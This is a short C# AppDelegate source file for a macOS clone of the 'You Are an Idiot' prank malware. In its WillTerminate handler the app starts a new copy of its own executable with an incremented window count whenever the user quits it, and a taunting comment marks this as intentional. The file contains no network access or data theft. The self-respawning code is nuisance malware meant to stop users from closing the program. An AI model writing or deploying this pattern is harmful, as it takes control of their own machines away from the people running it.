using System.Diagnostics;

namespace youareanidiot_macos;

[Register("AppDelegate")]
public class AppDelegate : NSApplicationDelegate
{
    public int windowCount = 0;
    
    public override void DidFinishLaunching(NSNotification notification)
    {
        // Insert code here to initialize your application
    }

    public override void WillTerminate(NSNotification notification)
    {
        // Oh buddy you have no idea what you've gotten yourself into
        Process newProcess = new Process();
        newProcess.StartInfo = new ProcessStartInfo(Environment.ProcessPath, (windowCount + 1).ToString());
        newProcess.Start();
    }
}